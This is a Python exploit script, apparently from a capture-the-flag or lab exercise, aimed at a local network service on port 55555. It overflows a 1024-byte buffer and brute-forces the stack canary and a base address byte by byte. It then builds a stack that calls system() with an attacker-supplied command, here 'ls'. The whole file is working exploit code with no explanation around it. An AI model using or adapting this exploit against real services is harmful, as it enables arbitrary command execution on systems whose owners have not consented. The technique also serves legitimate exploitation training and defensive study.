#!/usr/bin/python3
import socket as S
from binascii import hexlify, unhexlify
from struct import pack, unpack

def test_server_base_addr(username=b'toto', timeout=0.5,str_string = bytes(0,)):
	for i in range(0,256):
		# connect 
		s = S.socket(S.AF_INET, S.SOCK_STREAM)
		if timeout:
			s.settimeout(timeout)
		s.connect(('127.0.0.1', 55555))

		# Force stack
		s.send(pack("<H", 1))
		buf = str_string + (b'%c'%(i))
		s.send(pack("<H", len(buf)))
		s.send(buf)
		rep = s.recv(len(buf))
		try: 
			s.send(pack("<H", 2))
			bye = s.recv(100)
			s.close()
			return i
		except:
			pass
	return -1

def set_arg_serv(username=b'toto', timeout=0.5,str_string = bytes(0,)):
	for i in range(0,256):
		# connect 
		s = S.socket(S.AF_INET, S.SOCK_STREAM)
		if timeout:
			s.settimeout(timeout)
		s.connect(('127.0.0.1', 55555))

		s.send(pack("<H", 0))
		s.send(username)
		hello = s.recv(100)

		# Force stack
		s.send(pack("<H", 1))
		buf = str_string + (b'%c'%(i))
		s.send(pack("<H", len(buf)))
		s.send(buf)
		rep = s.recv(len(buf))
		try: 
			s.send(pack("<H", 2))
			bye = s.recv(100)
			s.close()
			return i
		except:
			pass
	return -1

def main():
	#buf2 = pack("<II", cookie, addr + 1)

	# Recherche de l'adresse + Canari
	buffer = b''
	res = b'A'*1024
	for i in range(0,8):
		f = bytes((test_server_base_addr('toto',0.05,res),))
		res += f
		buffer += f
	print(buffer.hex())

	# Convertion 
	cookie, base_addr = unpack("<II", buffer)
	print("Buffer in int format")
	print("%x %x"%(cookie, base_addr))
	cookie, base_addr = str(cookie), str(base_addr)
	print("Buffer in string format")
	print("%s %s"%(cookie, base_addr))
	
	# Calcul de l'adresse de base
	print("Adress before calc")
	print(base_addr)
	print("Adress after - got")
	addr = int(base_addr) - 0x3f90
	print(addr)
	print("Adress after - got")
	system_addr = addr + 0x10c0
	username_addr = addr + 0x4040

	#  Préparation de la stack
	res = b'A'*1024 + \
	int(cookie).to_bytes(4,'little') + \
	int(base_addr).to_bytes(4,'little') + \
	(0).to_bytes(8,'little') + \
	int(system_addr).to_bytes(4,'little') + \
	(0).to_bytes(4,'little') + \
	int(username_addr).to_bytes(4,'little')

	print(set_arg_serv(b'ls',1,res))

if __name__ == '__main__': main()
